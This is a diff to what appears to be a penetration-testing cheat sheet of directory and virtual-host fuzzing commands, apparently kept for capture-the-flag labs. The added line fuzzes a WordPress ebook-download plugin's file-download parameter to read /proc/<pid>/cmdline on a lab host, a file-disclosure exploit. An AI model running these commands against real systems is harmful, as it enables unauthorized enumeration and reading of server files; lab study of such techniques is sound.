@@ -82,6 +82,7 @@ gobuster dir -e -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/commo
 gobuster dir -e -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ext,ext2,ext3
 wfuzz --hc 404 -c -w /usr/share/seclists/Discovery/Web-Content/common.txt http://$IP/FUZZ.txt
 wfuzz -c --hc 403  -u http://paper -H "Host: FUZZ.paper" -w /usr/share/wfuzz/wordlist/general/common.txt
+wfuzz -u http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline -z range,1-1000 --hw 1
 ffuf -fc 403 -w /usr/share/wfuzz/wordlist/general/common.txt -u http://paper/ -H "Host: FUZZ.paper"
 ```
 
